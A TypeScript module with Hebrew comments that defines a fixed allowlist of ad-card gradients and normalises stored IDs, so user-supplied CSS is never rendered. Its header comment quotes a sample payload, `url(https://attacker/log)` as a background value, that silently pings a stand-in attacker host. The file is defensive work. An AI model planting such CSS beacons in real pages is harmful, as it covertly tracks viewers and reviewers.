// ============================================================
// gradients.ts - רשימת גרדיאנטים סגורה לכרטיס המודעה.
//
// למה רשימה סגורה ולא ערך CSS חופשי: באתר המקור המפרסם שמר מחרוזת CSS
// מלאה שרונדרה כ-background. Svelte מציב אותה דרך setProperty ולכן אי
// אפשר לפרוץ ממנה להצהרה אחרת או להריץ סקריפט — אבל
// `url(https://attacker/log)` הוא ערך background תקין לחלוטין, וכל מי
// שצפה בדף הנחיתה (כולל האדמין שבודק מודעה שטרם אושרה) היה שולח בקשה
// שקטה לשרת של המפרסם עם IP, דפדפן וזמן.
//
// ולידציה של CSS בביטוי רגולרי היא משחק מפסיד, ולכן לא שומרים CSS
// בכלל: נשמר מזהה מהרשימה, וה-CSS נבחר כאן.
//
// הפלטה היא בדיוק 22 הצבעים של הבילדר בקהילה בשכונה, והמזהה הוא זוג
// מחלקות ה-Tailwind שהבילדר שם שומר — כך פרסומת שמופצת משם נראית כאן
// באותם צבעים בדיוק, והכרטיס מצויר באותן מחלקות (bg-gradient-to-br
// לרצועה, bg-gradient-to-r לכפתור). המחרוזות כתובות כאן במלואן כדי
// ש-Tailwind ייצר אותן.
// ============================================================

export interface AdGradient {
    /** הערך שנשמר במודעה — זוג מחלקות from/to מהפלטה */
    id: string;
    /** מזהה הצבע בבילדר של קהילה בשכונה (מפתח התרגום advertise.p_<key>) */
    key: string;
    label: string;
    /** אותו גרדיאנט כמחרוזת CSS — לתצוגות שאינן הכרטיס (נייד, דף נחיתה) */
    css: string;
    /** צבע טקסט קריא מעל הגרדיאנט */
    ink: string;
}

export const AD_GRADIENTS: AdGradient[] = [
    { id: 'from-amber-500 to-orange-600', key: 'amber', label: 'כתום-זהב', css: 'linear-gradient(135deg, #f59e0b, #ea580c)', ink: '#ffffff' },
    { id: 'from-orange-500 to-red-500', key: 'orange', label: 'כתום בוהק', css: 'linear-gradient(135deg, #f97316, #ef4444)', ink: '#ffffff' },
    { id: 'from-yellow-400 to-amber-500', key: 'yellow', label: 'צהוב-זהב', css: 'linear-gradient(135deg, #facc15, #f59e0b)', ink: '#ffffff' },
    { id: 'from-red-600 to-pink-600', key: 'red', label: 'אדום-ורוד', css: 'linear-gradient(135deg, #dc2626, #db2777)', ink: '#ffffff' },
    { id: 'from-rose-500 to-fuchsia-600', key: 'rose', label: 'ורוד עז', css: 'linear-gradient(135deg, #f43f5e, #c026d3)', ink: '#ffffff' },
    { id: 'from-rose-700 to-red-900', key: 'crimson', label: 'בורדו', css: 'linear-gradient(135deg, #be123c, #7f1d1d)', ink: '#ffffff' },
    { id: 'from-fuchsia-500 to-purple-600', key: 'fuchsia', label: 'פוקסיה', css: 'linear-gradient(135deg, #d946ef, #9333ea)', ink: '#ffffff' },
    { id: 'from-purple-600 to-pink-600', key: 'purple', label: 'סגול-ורוד', css: 'linear-gradient(135deg, #9333ea, #db2777)', ink: '#ffffff' },
    { id: 'from-violet-600 to-indigo-700', key: 'violet', label: 'סגול עמוק', css: 'linear-gradient(135deg, #7c3aed, #4338ca)', ink: '#ffffff' },
    { id: 'from-indigo-600 to-blue-600', key: 'indigo', label: 'אינדיגו', css: 'linear-gradient(135deg, #4f46e5, #2563eb)', ink: '#ffffff' },
    { id: 'from-blue-600 to-cyan-600', key: 'blue', label: 'כחול', css: 'linear-gradient(135deg, #2563eb, #0891b2)', ink: '#ffffff' },
    { id: 'from-sky-400 to-blue-500', key: 'sky', label: 'תכלת', css: 'linear-gradient(135deg, #38bdf8, #3b82f6)', ink: '#ffffff' },
    { id: 'from-teal-500 to-cyan-600', key: 'teal', label: 'טורקיז', css: 'linear-gradient(135deg, #14b8a6, #0891b2)', ink: '#ffffff' },
    { id: 'from-emerald-500 to-teal-700', key: 'emerald', label: 'אזמרגד', css: 'linear-gradient(135deg, #10b981, #0f766e)', ink: '#ffffff' },
    { id: 'from-green-600 to-emerald-600', key: 'green', label: 'ירוק', css: 'linear-gradient(135deg, #16a34a, #059669)', ink: '#ffffff' },
    { id: 'from-lime-400 to-green-500', key: 'lime', label: 'ליים', css: 'linear-gradient(135deg, #a3e635, #22c55e)', ink: '#ffffff' },
    { id: 'from-slate-500 to-gray-700', key: 'slate', label: 'אפור-כסף', css: 'linear-gradient(135deg, #64748b, #374151)', ink: '#ffffff' },
    { id: 'from-gray-800 to-slate-900', key: 'dark', label: 'שחור-פלדה', css: 'linear-gradient(135deg, #1f2937, #0f172a)', ink: '#ffffff' },
    { id: 'from-orange-300 to-pink-400', key: 'peach', label: 'אפרסק', css: 'linear-gradient(135deg, #fdba74, #f472b6)', ink: '#ffffff' },
    { id: 'from-emerald-300 to-teal-400', key: 'mint', label: 'מנטה', css: 'linear-gradient(135deg, #6ee7b7, #2dd4bf)', ink: '#ffffff' },
    { id: 'from-yellow-500 to-amber-700', key: 'gold', label: 'זהב', css: 'linear-gradient(135deg, #eab308, #b45309)', ink: '#ffffff' },
    { id: 'from-slate-700 to-blue-900', key: 'midnight', label: 'חצות', css: 'linear-gradient(135deg, #334155, #1e3a8a)', ink: '#ffffff' },
];

export const DEFAULT_GRADIENT_ID = 'from-amber-500 to-orange-600';

/**
 * המזהים הקצרים שנשמרו כאן לפני שהפלטה אוחדה — וגם מה שהסנכרון של
 * קהילה בשכונה עדיין כותב לאתר הזה (gradient_id). כל אחד ממופה לצבע
 * שקהילה בשכונה מציגה לאותו כרטיס (טבלת GRADIENTS ב-shopAds.ts שם).
 */
const LEGACY_IDS: Record<string, string> = {
    amber: 'from-amber-500 to-orange-600',
    blue: 'from-blue-600 to-cyan-600',
    violet: 'from-purple-600 to-pink-600',
    rose: 'from-rose-500 to-fuchsia-600',
    ocean: 'from-indigo-600 to-blue-600',
    emerald: 'from-emerald-500 to-teal-700',
    sunset: 'from-orange-500 to-red-500',
    gold: 'from-yellow-500 to-amber-700',
    cyan: 'from-teal-500 to-cyan-600',
    slate: 'from-slate-500 to-gray-700',
};

/**
 * ערך כלשהו → מזהה מהפלטה. מקבל את הזוג עצמו (גם עם מחלקות נוספות
 * כמו bg-gradient-to-br), מזהה ישן, או נופל לברירת המחדל — לעולם לא
 * מחזיר ערך שאינו ברשימה.
 */
export function normalizeGradientId(value: unknown): string {
    const raw = String(value ?? '').trim();
    const pair = raw
        .split(/\s+/)
        .filter((c) => /^(from|to)-/.test(c))
        .join(' ');
    if (AD_GRADIENTS.some((g) => g.id === pair)) return pair;
    return LEGACY_IDS[raw] ?? DEFAULT_GRADIENT_ID;
}

export function gradientFor(value: unknown): AdGradient {
    const id = normalizeGradientId(value);
    return AD_GRADIENTS.find((g) => g.id === id) as AdGradient;
}

/** ה-CSS בפועל — תמיד מהרשימה, לעולם לא מקלט המשתמש */
export function gradientCss(value: unknown): string {
    return gradientFor(value).css;
}

export function gradientInk(value: unknown): string {
    return gradientFor(value).ink;
}
